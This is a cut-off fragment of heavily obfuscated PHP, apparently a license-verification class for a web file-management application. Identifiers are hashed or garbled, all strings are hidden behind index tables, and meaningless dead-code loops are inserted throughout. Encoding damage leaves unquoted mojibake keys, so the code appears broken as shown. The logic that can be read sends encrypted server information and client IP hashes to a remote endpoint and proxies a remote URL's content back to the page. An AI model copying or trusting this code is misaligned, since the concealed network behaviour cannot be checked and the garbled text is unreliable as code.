$this->mztsbedc011a(); $—ô´Ú÷½ = $‰¯Ğ•ñØ[686]; if (strlen($—ô´Ú÷½) < $‰¯Ğ•ñØ[449]) { return; } $this->zyks3f22085d(); $this->cvbg419a6485(); $this->qflo8b1eae7e(); $this->onke012d3c17($æÓÛ–»ı[25], array($this, $æÓÛ–»ı[26])); $•Şƒ«Ë§ = $‰¯Ğ•ñØ[687]; if (strlen($•Şƒ«Ë§) < $‰¯Ğ•ñØ[449]) { die; } $this->onke012d3c17($æÓÛ–»ı[27], array($this, $æÓÛ–»ı[28])); $‰µØÄãÁ = $‰¯Ğ•ñØ[688]; $this->onke012d3c17($æÓÛ–»ı[29], array($this, $æÓÛ–»ı[30])); $ÙÕº¨’ = $‰¯Ğ•ñØ[689]; $this->onke012d3c17($æÓÛ–»ı[31], array($this, $æÓÛ–»ı[32])); $¥½Í‚É÷ = $‰¯Ğ•ñØ[690]; if (!$¥½Í‚É÷) { return; } } public function ptxfea92a033($éÂ¶»¾™) { $´ã¯öûı =& $_SERVER[íû‘ş´]; $É‡½¿Ø© =& $_SERVER[¹£Ÿ×Òˆ]; $†¸ìö‹› = Model($É‡½¿Ø©[33])->get(); $Ù€İ·êÎ = array($É‡½¿Ø©[34], $É‡½¿Ø©[35], $É‡½¿Ø©[36], $É‡½¿Ø©[37], $É‡½¿Ø©[38], $É‡½¿Ø©[39], $É‡½¿Ø©[40], $É‡½¿Ø©[41], $É‡½¿Ø©[42], $É‡½¿Ø©[43], $É‡½¿Ø©[44], $É‡½¿Ø©[45], $É‡½¿Ø©[46], $É‡½¿Ø©[47], $É‡½¿Ø©[48], $É‡½¿Ø©[49], $É‡½¿Ø©[50], $É‡½¿Ø©[51], $É‡½¿Ø©[52], $É‡½¿Ø©[53], $É‡½¿Ø©[54], $É‡½¿Ø©[55], $É‡½¿Ø©[56], $É‡½¿Ø©[57], $É‡½¿Ø©[58], $É‡½¿Ø©[59], $É‡½¿Ø©[60], $É‡½¿Ø©[61], $É‡½¿Ø©[62], $É‡½¿Ø©[63], $É‡½¿Ø©[64], $É‡½¿Ø©[65], $É‡½¿Ø©[66], $É‡½¿Ø©[67], $É‡½¿Ø©[68], $É‡½¿Ø©[69], $É‡½¿Ø©[70], $É‡½¿Ø©[71], $É‡½¿Ø©[72], $É‡½¿Ø©[73], $É‡½¿Ø©[74], $É‡½¿Ø©[75], $É‡½¿Ø©[76], $É‡½¿Ø©[77], $É‡½¿Ø©[78], $É‡½¿Ø©[79], $É‡½¿Ø©[80], $É‡½¿Ø©[81], $É‡½¿Ø©[82], $É‡½¿Ø©[83], $É‡½¿Ø©[84]); $Œ¤ÑÂ‡ì = $´ã¯öûı[691]; while ($Œ¤ÑÂ‡ì < $´ã¯öûı[449]) { if ($Œ¤ÑÂ‡ì >= 0) { break; } $Œ¤ÑÂ‡ì++; } foreach ($Ù€İ·êÎ as $–ü€»áÍ) { $íæü˜¹… = $GLOBALS[$É‡½¿Ø©[85]][$É‡½¿Ø©[86]][$–ü€»áÍ]; $ÇŒèÍ¨ = $´ã¯öûı[692]; while (strlen($ÇŒèÍ¨) < $´ã¯öûı[671]) { if (!$ÇŒèÍ¨) { break; } $ÇŒèÍ¨++; } if (isset($†¸ìö‹›[$–ü€»áÍ])) { $íæü˜¹… = $†¸ìö‹›[$–ü€»áÍ]; } $éÂ¶»¾™[$É‡½¿Ø©[87]][$É‡½¿Ø©[88]][$–ü€»áÍ] = $íæü˜¹…; } $ˆÓõòˆ = $éÂ¶»¾™[$É‡½¿Ø©[87]][$É‡½¿Ø©[88]][$É‡½¿Ø©[46]]; unset($éÂ¶»¾™[$É‡½¿Ø©[87]][$É‡½¿Ø©[89]][$É‡½¿Ø©[90]]); $–ãß¯üÚ = $´ã¯öûı[693]; if (strlen($–ãß¯üÚ) < $´ã¯öûı[662]) { die; } unset($éÂ¶»¾™[$É‡½¿Ø©[87]][$É‡½¿Ø©[89]][$É‡½¿Ø©[91]]); $Œ¢­Æ = $´ã¯öûı[694]; while (strlen($Œ¢­Æ) < $´ã¯öûı[667]) { if (!$Œ¢­Æ) { break; } $Œ¢­Æ++; } unset($éÂ¶»¾™[$É‡½¿Ø©[87]][$É‡½¿Ø©[88]][$É‡½¿Ø©[46]]); $ÛåüÊáÖ = $´ã¯öûı[695]; if (!$ÛåüÊáÖ) { die; } unset($éÂ¶»¾™[$É‡½¿Ø©[87]][$É‡½¿Ø©[88]][$É‡½¿Ø©[92]]); $Ÿáíğğ = $´ã¯öûı[696]; $éÂ¶»¾™[$É‡½¿Ø©[87]][$É‡½¿Ø©[88]][$É‡½¿Ø©[93]] = array($É‡½¿Ø©[94] => (int) $ˆÓõòˆ[$É‡½¿Ø©[95]], $É‡½¿Ø©[96] => (int) _get($ˆÓõòˆ, $É‡½¿Ø©[97], 0)); $‹øäÁÁ = $´ã¯öûı[697]; if (strlen($‹øäÁÁ) < $´ã¯öûı[665]) { return; } $Î°³ï‰ = substr(md5($É‡½¿Ø©[98] . get_client_ip() . $†¸ìö‹›[$É‡½¿Ø©[99]]), 0, 15); $ù÷áìŒ = $´ã¯öûı[698]; $éÂ¶»¾™[$É‡½¿Ø©[100]][$É‡½¿Ø©[101]] = Mcrypt::encode(Session::sign(), $Î°³ï‰, 3600 * 24); $ÌÇ²Š´Â = $´ã¯öûı[699]; $éÂ¶»¾™[$É‡½¿Ø©[100]][$É‡½¿Ø©[102]] = Action($É‡½¿Ø©[103])->accessToken(); $”¶“û£à = $´ã¯öûı[700]; while (strlen($”¶“û£à) < $´ã¯öûı[449]) { if (!$”¶“û£à) { break; } $”¶“û£à++; } $éÂ¶»¾™[$É‡½¿Ø©[100]][$É‡½¿Ø©[104]] = md5($_SERVER[$É‡½¿Ø©[105]] . $†¸ìö‹›[$É‡½¿Ø©[99]]); $éÂ¶»¾™[$É‡½¿Ø©[100]][$É‡½¿Ø©[106]] = base64_encode(serverInfo()); $×Ôã®î€ = $´ã¯öûı[701]; if (strlen($×Ôã®î€) < $´ã¯öûı[671]) { die; } $éÂ¶»¾™[$É‡½¿Ø©[100]][$É‡½¿Ø©[107]] = $this->owcj8fea24cd; if ($†¸ìö‹›[$É‡½¿Ø©[107]] != $É‡½¿Ø©[108]) { $éÂ¶»¾™[$É‡½¿Ø©[100]][$É‡½¿Ø©[109]] = $†¸ìö‹›[$É‡½¿Ø©[109]]; $éÂ¶»¾™[$É‡½¿Ø©[100]][$É‡½¿Ø©[110]] = $†¸ìö‹›[$É‡½¿Ø©[110]]; $ŒƒÕÛ²¦ = rand_string(10) . $this->owcj8fea24cd . rand_string(5); $éÂ¶»¾™[$É‡½¿Ø©[87]][$É‡½¿Ø©[111]][$É‡½¿Ø©[112]] = $this->ovhce9dd7fa2($ŒƒÕÛ²¦, $éÂ¶»¾™[$É‡½¿Ø©[100]][$É‡½¿Ø©[104]]); } if ($this->owcj8fea24cd == $É‡½¿Ø©[108]) { $éÂ¶»¾™[$É‡½¿Ø©[87]][$É‡½¿Ø©[88]][$É‡½¿Ø©[93]][$É‡½¿Ø©[97]] = 0; } $éÂ¶»¾™[$É‡½¿Ø©[100]][$É‡½¿Ø©[113]] = _get($this->ydfweedb354d, $É‡½¿Ø©[114], $É‡½¿Ø©[6]); $éÂ¶»¾™[$É‡½¿Ø©[100]][$É‡½¿Ø©[115]] = _get($this->ydfweedb354d, $É‡½¿Ø©[116], $É‡½¿Ø©[6]); $Ëœóó¤¶ = $´ã¯öûı[702]; if (_get($GLOBALS, $É‡½¿Ø©[117]) && $this->config[$É‡½¿Ø©[118]]) { $éÂ¶»¾™[$É‡½¿Ø©[100]][$É‡½¿Ø©[119]] = WEB_ROOT; } return $éÂ¶»¾™; } private function cvbg419a6485() { $ÂğÙ±É =& $_SERVER[íû‘ş´]; $¨öâ¤õ… =& $_SERVER[¹£Ÿ×Òˆ]; $ğæ´î = $_SERVER[$¨öâ¤õ…[24]] == $¨öâ¤õ…[120]; if ($_SERVER[$¨öâ¤õ…[24]] == $¨öâ¤õ…[121] && $_GET[$¨öâ¤õ…[122]] == $¨öâ¤õ…[123]) { $ğæ´î = !0; } if ($ğæ´î) { $“ôÌú®€ = array($¨öâ¤õ…[107] => $this->owcj8fea24cd, $¨öâ¤õ…[124] => $this->rpty4cf30765(), $¨öâ¤õ…[125] => Model($¨öâ¤õ…[126])->count()); if ($this->owcj8fea24cd != $¨öâ¤õ…[108]) { $õ€ÂóÎŠ = _get($this->ydfweedb354d, $¨öâ¤õ…[127]); if ($õ€ÂóÎŠ) { $“ôÌú®€[$¨öâ¤õ…[128]] = $õ€ÂóÎŠ; $“ôÌú®€[$¨öâ¤õ…[129]] = strtotime(_get($this->ydfweedb354d, $¨öâ¤õ…[130])); $“ôÌú®€[$¨öâ¤õ…[131]] = _get($this->ydfweedb354d, $¨öâ¤õ…[116]); } $Ëş§¡´Ì = Model($¨öâ¤õ…[33])->get($¨öâ¤õ…[132], $¨öâ¤õ…[6], !0); if (is_string($Ëş§¡´Ì) && substr($Ëş§¡´Ì, 0, 1) == $¨öâ¤õ…[133]) { $Ëş§¡´Ì = json_decode_force($Ëş§¡´Ì); } if (is_array($Ëş§¡´Ì) && $Ëş§¡´Ì[$¨öâ¤õ…[134]] && strstr($Ëş§¡´Ì[$¨öâ¤õ…[134]], $¨öâ¤õ…[135])) { $¯™×á˜Ş = explode($¨öâ¤õ…[135], $Ëş§¡´Ì[$¨öâ¤õ…[134]]); $“ôÌú®€[$¨öâ¤õ…[136]] = $¯™×á˜Ş[0]; } } $“ôÌú®€ = $this->mvle44606628(json_encode($“ôÌú®€), md5($¨öâ¤õ…[137])); $ÆÈÁÍ€ = array($¨öâ¤õ…[138] => $“ôÌú®€); $ü“éğ½Ş = $ÂğÙ±É[703]; if (strlen($ü“éğ½Ş) < $ÂğÙ±É[449]) { die; } call_user_func(array($¨öâ¤õ…[139], $¨öâ¤õ…[140]), $ÆÈÁÍ€); $²­ó¹¾’ = $ÂğÙ±É[704]; } if ($this->owcj8fea24cd == $¨öâ¤õ…[108]) { return; } $íØÑš¼İ = array($¨öâ¤õ…[141], $¨öâ¤õ…[142], $¨öâ¤õ…[143], $¨öâ¤õ…[144], $¨öâ¤õ…[145], $¨öâ¤õ…[146]); $”õ‡ìùï = $ÂğÙ±É[705]; while ($”õ‡ìùï < $ÂğÙ±É[671]) { if ($”õ‡ìùï >= 0) { break; } $”õ‡ìùï++; } $ÚÁØ§òÈ = Model($¨öâ¤õ…[33])->get(); $Ó·„ƒŠ = $ÂğÙ±É[706]; if (!$Ó·„ƒŠ) { return; } $ÆÈÁÍ€ = array($¨öâ¤õ…[147] => $ÚÁØ§òÈ[$¨öâ¤õ…[34]], $¨öâ¤õ…[148] => $ÚÁØ§òÈ[$¨öâ¤õ…[35]], $¨öâ¤õ…[149] => $¨öâ¤õ…[6]); $«®¤·â = $ÂğÙ±É[707]; foreach ($íØÑš¼İ as $ËÂ³¼«) { if (!isset($ÚÁØ§òÈ[$ËÂ³¼«]) || !$ÚÁØ§òÈ[$ËÂ³¼«]) { continue; } $ÆÈÁÍ€[$ËÂ³¼«] = $ÚÁØ§òÈ[$ËÂ³¼«]; } call_user_func(array($¨öâ¤õ…[139], $¨öâ¤õ…[140]), $ÆÈÁÍ€); } private function mztsbedc011a() { $ÎÃà‹ÕË =& $_SERVER[íû‘ş´]; $¬¸éµå =& $_SERVER[¹£Ÿ×Òˆ]; if ($_SERVER[$¬¸éµå[24]] != $¬¸éµå[150]) { return; } if (!_get($GLOBALS, $¬¸éµå[117])) { die; } $›ş»ŠÅã = $GLOBALS[$¬¸éµå[13]]; if (isset($›ş»ŠÅã[$¬¸éµå[151]])) { $this->nfir67134729(); die; } if (isset($›ş»ŠÅã[$¬¸éµå[152]]) && isset($›ş»ŠÅã[$¬¸éµå[152]]) == $¬¸éµå[123]) { $›ş»ŠÅã[$¬¸éµå[153]] = Model($¬¸éµå[33])->get($¬¸éµå[154]); } if (!isset($›ş»ŠÅã[$¬¸éµå[153]]) || strlen($›ş»ŠÅã[$¬¸éµå[153]]) != 16) { show_json($¬¸éµå[155] . $›ş»ŠÅã[$¬¸éµå[153]], !1); } $³ª¢æî¨ = Model($¬¸éµå[33])->get($¬¸éµå[99]); $ôƒ¯øÈ = md5($_SERVER[$¬¸éµå[105]] . $³ª¢æî¨); $˜À±¡‡ö = array($¬¸éµå[153] => $›ş»ŠÅã[$¬¸éµå[153]], $¬¸éµå[156] => rand_string(16), $¬¸éµå[157] => $¬¸éµå[137], $¬¸éµå[158] => $¬¸éµå[159], $¬¸éµå[160] => $_SERVER[$¬¸éµå[161]], $¬¸éµå[162] => $_SERVER[$¬¸éµå[163]], $¬¸éµå[164] => $_SERVER[$¬¸éµå[165]], $¬¸éµå[104] => $ôƒ¯øÈ, $¬¸éµå[166] => Model($¬¸éµå[33])->get($¬¸éµå[132])); $ïûÄ¯¾ = $ÎÃà‹ÕË[708]; if (strlen($ïûÄ¯¾) < $ÎÃà‹ÕË[662]) { return; } if ($›ş»ŠÅã[$¬¸éµå[167]] == $¬¸éµå[168]) { $‹‚Ì—Îõ = $this->mvle44606628($ôƒ¯øÈ, $¬¸éµå[169]); $‰ºŒ«Ô = $this->ovhce9dd7fa2(json_encode($˜À±¡‡ö), $ôƒ¯øÈ . $¬¸éµå[170], 3); $‰ºŒ«Ô = $‰ºŒ«Ô . $¬¸éµå[171] . $_SERVER[$¬¸éµå[161]]; $Çî•û‰š = $this->twvh663fd34d($¬¸éµå[172] . $‹‚Ì—Îõ . $¬¸éµå[173] . $‰ºŒ«Ô, -1); show_json($Çî•û‰š, !0); } else { if ($›ş»ŠÅã[$¬¸éµå[167]] == $¬¸éµå[174]) { $ûøÃ˜ = substr(md5($¬¸éµå[175] . $ôƒ¯øÈ), 12, 15) . $¬¸éµå[176]; $‰ºŒ«Ô = $this->ydrlde8a4d4d(trim($›ş»ŠÅã[$¬¸éµå[177]]), $ûøÃ˜, 2); $Ï¨¯¹©ó = json_decode($‰ºŒ«Ô, !0); if (!is_array($Ï¨¯¹©ó) || !is_array($Ï¨¯¹©ó[$¬¸éµå[178]]) || $Ï¨¯¹©ó[$¬¸éµå[153]] != !0) { $©¥çŸèñ = $¬¸éµå[179]; $–âŒêª¬ = $Ï¨¯¹©ó[$¬¸éµå[178]] ? $¬¸éµå[180] . $Ï¨¯¹©ó[$¬¸éµå[178]] : $©¥çŸèñ; show_json($–âŒêª¬, !1); } else { $˜À±¡‡ö[$¬¸éµå[156]] = $Ï¨¯¹©ó[$¬¸éµå[178]][$¬¸éµå[181]]; } } else { $Ï¨¯¹©ó = $this->twvh663fd34d($¬¸éµå[182], $˜À±¡‡ö, 10); } } if (!is_array($Ï¨¯¹©ó) || !is_array($Ï¨¯¹©ó[$¬¸éµå[178]]) || $Ï¨¯¹©ó[$¬¸éµå[153]] != !0) { $©¥çŸèñ = LNG($¬¸éµå[183]); $–âŒêª¬ = $Ï¨¯¹©ó[$¬¸éµå[178]] ? $¬¸éµå[180] . $Ï¨¯¹©ó[$¬¸éµå[178]] : $©¥çŸèñ; show_json($–âŒêª¬, !1); } $óñèçËï = $Ï¨¯¹©ó[$¬¸éµå[178]]; $ğŒÃ¥œ = $this->wnek363bfce7($óñèçËï[$¬¸éµå[184]]); $¤íã»¨» = $ÎÃà‹ÕË[709]; if (!$ğŒÃ¥œ || $ğŒÃ¥œ != $óñèçËï[$¬¸éµå[130]]) { $ÊÚÙƒ‹ª = array($¬¸éµå[185] => Model($¬¸éµå[33])->get($¬¸éµå[99]), $¬¸éµå[186] => $_SERVER[$¬¸éµå[105]], $¬¸éµå[187] => this_url(), $¬¸éµå[162] => $_SERVER[$¬¸éµå[163]]); $‰ºŒ«Ô = $this->cwuk82278419(json_encode($ÊÚÙƒ‹ª)); $this->twvh663fd34d($¬¸éµå[188] . $‰ºŒ«Ô); show_json(LNG($¬¸éµå[189]), !0); } $‰ûĞ‘Å = array($¬¸éµå[154] => $óñèçËï[$¬¸éµå[190]], $¬¸éµå[191] => $óñèçËï[$¬¸éµå[192]], $¬¸éµå[193] => rand_string(16), $¬¸éµå[107] => $óñèçËï[$¬¸éµå[194]]); if ($˜À±¡‡ö[$¬¸éµå[156]]) { $‰ûĞ‘Å[$¬¸éµå[193]] = $˜À±¡‡ö[$¬¸éµå[156]]; } $™ï şÅæ = substr(md5($‰ûĞ‘Å[$¬¸éµå[191]]), 10, 10); $¦Êİ´Õğ = $™ï şÅæ . $‰ûĞ‘Å[$¬¸éµå[107]] . $‰ûĞ‘Å[$¬¸éµå[193]]; $Ò·óÉĞ¶ = $ÎÃà‹ÕË[710]; if (strlen($Ò·óÉĞ¶) < $ÎÃà‹ÕË[662]) { return; } $‰ûĞ‘Å[$¬¸éµå[109]] = strrev(base64_encode($this->mvle44606628($¦Êİ´Õğ, $¬¸éµå[195]))); $ÉèÌ ıå = rand_string(16); $º„Œá“ç = $ÎÃà‹ÕË[711]; if (!$º„Œá“ç) { return; } $ë»‚îú‰ = $ÉèÌ ıå . $‰ûĞ‘Å[$¬¸éµå[107]] . $this->mvle44606628(md5($‰ûĞ‘Å[$¬¸éµå[154]]), $ÉèÌ ıå); $‰ûĞ‘Å[$¬¸éµå[110]] = base64_encode(strrev($this->mvle44606628($ë»‚îú‰, $¬¸éµå[196]))); $ıŠ˜‘œ = $ÎÃà‹ÕË[712]; while (strlen($ıŠ˜‘œ) < $ÎÃà‹ÕË[449]) { if (!$ıŠ˜‘œ) { break; } $ıŠ˜‘œ++; } if ($óñèçËï[$¬¸éµå[197]] && $óñèçËï[$¬¸éµå[197]] >= 1) { Model($¬¸éµå[33])->setDeep($¬¸éµå[198], $¬¸éµå[123]); } Model($¬¸éµå[33])->set($‰ûĞ‘Å); $„™¿Ş¡ª = md5($_SERVER[$¬¸éµå[105]] . strrev($³ª¢æî¨) . $‰ûĞ‘Å[$¬¸éµå[191]]); $Îº» È = strrev(substr($„™¿Ş¡ª, 10, 16)); $¤½ÚáŠì = $ÎÃà‹ÕË[713]; if (strlen($¤½ÚáŠì) < $ÎÃà‹ÕË[665]) { die; } $òá“„« = $this->ovhce9dd7fa2(json_encode($óñèçËï), $„™¿Ş¡ª); $•¥›¬ÀÈ = array_to_keyvalue(Model($¬¸éµå[7])->listData(), $¬¸éµå[199]); $“‚¢»Ïë = $•¥›¬ÀÈ[$¬¸éµå[200]]; $„·ÕÛÛŞ = array(); $«¯Ãå¥“ = $ÎÃà‹ÕË[714]; if (!$«¯Ãå¥“) { die; } $„·ÕÛÛŞ[$Îº» È] = $òá“„«; $ä“ùš®³ = $ÎÃà‹ÕË[715]; if (strlen($ä“ùš®³) < $ÎÃà‹ÕË[665]) { return; } Model($¬¸éµå[7])->update($“‚¢»Ïë[$¬¸éµå[201]], array($¬¸éµå[202] => $„·ÕÛÛŞ)); $¤©œÇï« = $ÎÃà‹ÕË[716]; if (strlen($¤©œÇï«) < $ÎÃà‹ÕË[449]) { die; } $this->ydfweedb354d = $óñèçËï; $’¯”å = $ÎÃà‹ÕË[717]; if (!$’¯”å) { return; } $this->owcj8fea24cd = $‰ûĞ‘Å[$¬¸éµå[107]]; $Ş„ß¯‘É = $ÎÃà‹ÕË[718]; while ($Ş„ß¯‘É < $ÎÃà‹ÕË[662]) { if ($Ş„ß¯‘É >= 0) { break; } $Ş„ß¯‘É++; } $this->licenseRegistSuccess(); $¤–àÏâ = $ÎÃà‹ÕË[719]; while ($¤–àÏâ < $ÎÃà‹ÕË[662]) { if ($¤–àÏâ >= 0) { break; } $¤–àÏâ++; } Cache::set($¬¸éµå[203] . md5($³ª¢æî¨ . $¬¸éµå[204]), $¬¸éµå[6]); $ï¡°‘Ü¨ = $ÎÃà‹ÕË[720]; show_json(LNG($¬¸éµå[189]), !0); } private function licenseRegistSuccess() { $Æá‡Öõò =& $_SERVER[¹£Ÿ×Òˆ]; $ìÛà´ùî = Model($Æá‡Öõò[33])->get(); $´Û³º¸ = $_SERVER[íû‘ş´][721]; if (!$´Û³º¸) { die; } if ($ìÛà´ùî[$Æá‡Öõò[63]] != $Æá‡Öõò[123]) { Model($Æá‡Öõò[33])->set($Æá‡Öõò[63], $Æá‡Öõò[123]); } Action($Æá‡Öõò[205])->initStart(!0); } private function nfir67134729() { $Øä»†Ì™ =& $_SERVER[íû‘ş´]; $íÉ¸‰ê´ =& $_SERVER[¹£Ÿ×Òˆ]; Model($íÉ¸‰ê´[33])->set(array($íÉ¸‰ê´[154] => $íÉ¸‰ê´[6], $íÉ¸‰ê´[191] => $íÉ¸‰ê´[6], $íÉ¸‰ê´[107] => $íÉ¸‰ê´[108], $íÉ¸‰ê´[109] => $íÉ¸‰ê´[6], $íÉ¸‰ê´[110] => $íÉ¸‰ê´[6])); $›çãıŠ¸ = $Øä»†Ì™[722]; if (strlen($›çãıŠ¸) < $Øä»†Ì™[662]) { return; } Model($íÉ¸‰ê´[33])->setDeep($íÉ¸‰ê´[198], $íÉ¸‰ê´[206]); $­÷àÒØÓ = $Øä»†Ì™[723]; $this->ydfweedb354d = array(); $this->owcj8fea24cd = $íÉ¸‰ê´[108]; } private function wpnkbf9b0e35() { $ïÃ—°è‚ =& $_SERVER[íû‘ş´]; $øœ¬ú™Ç =& $_SERVER[¹£Ÿ×Òˆ]; $_SERVER[$øœ¬ú™Ç[163]] = _get($_SERVER, $øœ¬ú™Ç[163], APP_HOST); $this->owcj8fea24cd = $øœ¬ú™Ç[108]; $…¢†¡ş¢ = $ïÃ—°è‚[724]; $øÁëÖº¯ = Model($øœ¬ú™Ç[33])->get(); if ($øÁëÖº¯[$øœ¬ú™Ç[107]] == $øœ¬ú™Ç[108]) { return; } $õÑÇ¡“Ÿ = Model($øœ¬ú™Ç[33])->get($øœ¬ú™Ç[99]); $ºÊÌÀé = $ïÃ—°è‚[725]; if (strlen($ºÊÌÀé) < $ïÃ—°è‚[665]) { return; } $ÃÒ¸Öı¸ = $øœ¬ú™Ç[203] . md5($õÑÇ¡“Ÿ . $øœ¬ú™Ç[204]); $º™Š·±¹ = Cache::get($ÃÒ¸Öı¸); if (!is_array($º™Š·±¹) || !isset($º™Š·±¹[$øœ¬ú™Ç[207]]) || time() - $º™Š·±¹[$øœ¬ú™Ç[207]] >= 60) { $³ú÷¶Ëã = Model($øœ¬ú™Ç[7])->loadList(); $Ğó‚…“Ï = $³ú÷¶Ëã[$øœ¬ú™Ç[200]]; $—‚ÜÔÒ = md5($_SERVER[$øœ¬ú™Ç[105]] . strrev($õÑÇ¡“Ÿ) . $øÁëÖº¯[$øœ¬ú™Ç[191]]); $»ƒ”¤Ú— = strrev(substr($—‚ÜÔÒ, 10, 16)); $º™Š·±¹ = $this->ydrlde8a4d4d($Ğó‚…“Ï[$øœ¬ú™Ç[85]][$»ƒ”¤Ú—], $—‚ÜÔÒ); $º™Š·±¹ = json_decode($º™Š·±¹, !0); } if (!is_array($º™Š·±¹)) { return $this->nfir67134729(); } $Õ¥œ„™ù = strtotime($º™Š·±¹[$øœ¬ú™Ç[130]]); if (time() >= $Õ¥œ„™ù) { return $this->nfir67134729(); } if (time() - $º™Š·±¹[$øœ¬ú™Ç[207]] > 20) { $º™Š·±¹[$øœ¬ú™Ç[207]] = time(); Cache::set($ÃÒ¸Öı¸, $º™Š·±¹); } $this->ydfweedb354d = $º™Š·±¹; $this->owcj8fea24cd = $øÁëÖº¯[$øœ¬ú™Ç[107]]; $‡ñ÷ò€Ñ = $ïÃ—°è‚[726]; if (!$‡ñ÷ò€Ñ) { die; } } private function xiku8591785a() { $ç§’Ìú² =& $_SERVER[íû‘ş´]; $ÕÛ€ëùİ =& $_SERVER[¹£Ÿ×Òˆ]; $ú†ª = $GLOBALS[$ÕÛ€ëùİ[13]]; $ÖÑáËÍ’ = $_SERVER[$ÕÛ€ëùİ[24]]; $†·ã°¤Ù = $ç§’Ìú²[727]; if (strlen($†·ã°¤Ù) < $ç§’Ìú²[449]) { return; } if ($ÖÑáËÍ’ == $ÕÛ€ëùİ[208] && $this->owcj8fea24cd == $ÕÛ€ëùİ[108]) { show_json(LNG($ÕÛ€ëùİ[209]), !1, $ÕÛ€ëùİ[210]); } $àÙ±“Ü¨ = array($ÕÛ€ëùİ[211], $ÕÛ€ëùİ[212]); if (in_array($ÖÑáËÍ’, $àÙ±“Ü¨)) { if ($this->owcj8fea24cd == $ÕÛ€ëùİ[108] && isset($ú†ª[$ÕÛ€ëùİ[213]])) { show_json(LNG($ÕÛ€ëùİ[209]), !1, $ÕÛ€ëùİ[210]); die; } $£şÊ¾æ = $this->rpty4cf30765(); if ($£şÊ¾æ != intval($ÕÛ€ëùİ[214])) { if ($£şÊ¾æ <= Model($ÕÛ€ëùİ[126])->count()) { show_json(LNG($ÕÛ€ëùİ[215]), !1, $ÕÛ€ëùİ[210]); die; } } } } private function cjdocc2c61c9() { $Œ³Æå…Ü =& $_SERVER[íû‘ş´]; $«Äßƒğ =& $_SERVER[¹£Ÿ×Òˆ]; $ÙƒŒï„ã = array($«Äßƒğ[120], $«Äßƒğ[121]); $£—Œ­ğÛ = $Œ³Æå…Ü[728]; while (strlen($£—Œ­ğÛ) < $Œ³Æå…Ü[449]) { if (!$£—Œ­ğÛ) { break; } $£—Œ­ğÛ++; } if (!_get($GLOBALS, $«Äßƒğ[117]) || !isset($_GET[$«Äßƒğ[216]])) { return; } if (!in_array($_SERVER[$«Äßƒğ[24]], $ÙƒŒï„ã)) { return; } $©‘¨Ú÷ = $«Äßƒğ[217]; $ÏÁ¯‡ìŒ = $Œ³Æå…Ü[729]; if (strlen($ÏÁ¯‡ìŒ) < $Œ³Æå…Ü[662]) { die; } $©‘¨Ú÷ = $this->xonlfcdaa11f($©‘¨Ú÷, $«Äßƒğ[218]); $†ÅÁü·¢ = stream_context_create(array($«Äßƒğ[219] => array($«Äßƒğ[220] => $«Äßƒğ[221], $«Äßƒğ[222] => 3))); $›»¥ûéÔ = @file_get_contents($©‘¨Ú÷, !1, $†ÅÁü·¢); $»ğØ¦š = $Œ³Æå…Ü[730]; header($«Äßƒğ[223]); if ($›»¥ûéÔ && strstr($›»¥ûéÔ, $«Äßƒğ[224])) { echo $›»¥ûéÔ; } die; } public function tjixb52a829c($ÏÓ®–¦) { $ÉÈ€±‡ =& $_SERVER[íû‘ş´]; $üÎÃøÙÇ =& $_SERVER[¹£Ÿ×Òˆ]; if ($this->owcj8fea24cd == $üÎÃøÙÇ[225]) { return $ÏÓ®–¦; } $äĞ´‘º = array($üÎÃøÙÇ[226] => $üÎÃøÙÇ[227], $üÎÃøÙÇ[228] => $üÎÃøÙÇ[227], $üÎÃøÙÇ[229] => $üÎÃøÙÇ[227], $üÎÃøÙÇ[230] => $üÎÃøÙÇ[231], $üÎÃøÙÇ[232] => $üÎÃøÙÇ[231], $üÎÃøÙÇ[233] => $üÎÃøÙÇ[231], $üÎÃøÙÇ[234] => $üÎÃøÙÇ[231], $üÎÃøÙÇ[235] => $üÎÃøÙÇ[231], $üÎÃøÙÇ[236] => $üÎÃøÙÇ[231], $üÎÃøÙÇ[237] => $üÎÃøÙÇ[231], $üÎÃøÙÇ[238] => $üÎÃøÙÇ[231], $üÎÃøÙÇ[239] => $üÎÃøÙÇ[231], $üÎÃøÙÇ[240] => $üÎÃøÙÇ[231], $üÎÃøÙÇ[241] => $üÎÃøÙÇ[231], $üÎÃøÙÇ[242] => $üÎÃøÙÇ[231]); $‹ğÒüœÊ = explode($üÎÃøÙÇ[243], _get($this->ydfweedb354d, $üÎÃøÙÇ[114], $üÎÃøÙÇ[6])); $æî©à€½ = $ÉÈ€±‡[731]; if (strlen($æî©à€½) < $ÉÈ€±‡[667]) { return; } $‰öÕÕîô = array(); $Òâı„µó = $ÉÈ€±‡[732]; foreach ($äĞ´‘º as $òŞÜ¿Ë => $ØÃ¼õ°„) { if ($ØÃ¼õ°„ == $üÎÃøÙÇ[227] && substr($this->owcj8fea24cd, 0, 1) == $üÎÃøÙÇ[227]) { continue; } if (!in_array($òŞÜ¿Ë, $‹ğÒüœÊ)) { $‰öÕÕîô[] = $òŞÜ¿Ë; } } foreach ($‰öÕÕîô as $òŞÜ¿Ë) { unset($ÏÓ®–¦[$òŞÜ¿Ë]); $Ï×Ğ‰Â  = $ÉÈ€±‡[733]; if (strlen($Ï×Ğ‰Â ) < $ÉÈ€±‡[662]) { die; } } return $ÏÓ®–¦; $êéÓê±º = $ÉÈ€±‡[734]; while ($êéÓê±º < $ÉÈ€±‡[665]) { if ($êéÓê±º >= 0) { break; } $êéÓê±º++; } } private function qflo8b1eae7e() { $ÊáØ·ğá =& $_SERVER[¹£Ÿ×Òˆ]; if ($this->owcj8fea24cd != $ÊáØ·ğá[108]) { $GLOBALS[$ÊáØ·ğá[85]][$ÊáØ·ğá[89]][$ÊáØ·ğá[244]] = $ÊáØ·ğá[206]; return; } $GLOBALS[$ÊáØ·ğá[85]][$ÊáØ·ğá[245]] = $ÊáØ·ğá[123]; if (Model($ÊáØ·ğá[246])->get($ÊáØ·ğá[63]) != $ÊáØ·ğá[206]) { Model($ÊáØ·ğá[246])->set($ÊáØ·ğá[63], $ÊáØ·ğá[206]); } } public function aoehaee05b37() { return $_SERVER[¹£Ÿ×Òˆ][247]; } private function zyks3f22085d() { $‘İş›ôı =& $_SERVER[íû‘ş´]; $·—Š÷¢Š =& $_SERVER[¹£Ÿ×Òˆ]; $ÔÏ¯®³ã = array($·—Š÷¢Š[248], $·—Š÷¢Š[249], $·—Š÷¢Š[250]); $é‡ùÆßü = $·—Š÷¢Š[251] . md5($·—Š÷¢Š[252]); $³®ƒûÍÇ = $‘İş›ôı[735]; if (!$³®ƒûÍÇ) { die; } if ($this->owcj8fea24cd == $·—Š÷¢Š[108] || !_get($GLOBALS, $·—Š÷¢Š[117])) { return; } if 